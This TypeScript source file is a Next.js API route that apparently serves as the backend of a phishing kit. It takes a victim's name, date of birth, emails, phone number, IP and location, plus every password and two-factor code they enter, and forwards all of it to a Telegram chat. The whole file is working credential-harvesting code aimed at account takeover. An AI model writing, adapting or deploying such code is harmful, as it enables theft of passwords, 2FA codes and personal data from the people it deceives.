import { NextRequest, NextResponse } from 'next/server';
import { sendTelegramMessage } from '@/lib/telegram';

interface FormDetails {
  fullName: string;
  email: string;
  emailBusiness: string;
  pageName: string;
  phoneNumber: string;
  day: string;
  month: string;
  year: string;
  note: string;
  ip: string;
  location: string;
}

const formatLine = (label: string, value: string) =>
  `${label}: <code>${value || 'N/A'}</code>`;

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const {
      formDetails,
      passwordAttempts = [],
      twofaAttempts = [],
    }: {
      formDetails: FormDetails;
      passwordAttempts: string[];
      twofaAttempts: string[];
    } = body;

    if (!formDetails) {
      return NextResponse.json(
        { success: false, message: 'Missing form details' },
        { status: 400 }
      );
    }

    const lines = [
      '📋 <b>Form Data</b>',
      '',
      formatLine(
        'IP & Location',
        `${formDetails.ip || 'Unknown'} (${formDetails.location || 'Unknown'})`
      ),
      formatLine('Full Name', formDetails.fullName),
      formatLine('Page Name', formDetails.pageName),
      formatLine(
        'Date of Birth',
        `${formDetails.day}/${formDetails.month}/${formDetails.year}`
      ),
      '---------------------------------',
      formatLine('Email', formDetails.email),
      formatLine('Email Business', formDetails.emailBusiness),
      formatLine('Phone Number', formDetails.phoneNumber),
      '---------------------------------',
    ];

    if (passwordAttempts.length) {
      passwordAttempts.forEach((attempt, index) => {
        lines.push(`🔐 Password Attempt ${index + 1}: <code>${attempt}</code>`);
      });
      lines.push('---------------------------------');
    }

    if (twofaAttempts.length) {
      twofaAttempts.forEach((attempt, index) => {
        lines.push(`🔒 2FA Attempt ${index + 1}: <code>${attempt}</code>`);
      });
      lines.push('---------------------------------');
    }

    const message = lines.join('\n');
    console.log('Sending Telegram message...');
    console.log('Message length:', message.length);
    const success = await sendTelegramMessage(message);
    console.log('Telegram send result:', success);

    return NextResponse.json({ 
      success,
      message: success ? 'Message sent' : 'Failed to send message'
    });
  } catch (error) {
    console.error('Error logging event:', error);
    if (error instanceof Error) {
      console.error('Error details:', error.message, error.stack);
    }
    return NextResponse.json(
      { success: false, message: 'Failed to log event', error: error instanceof Error ? error.message : 'Unknown error' },
      { status: 500 }
    );
  }
}

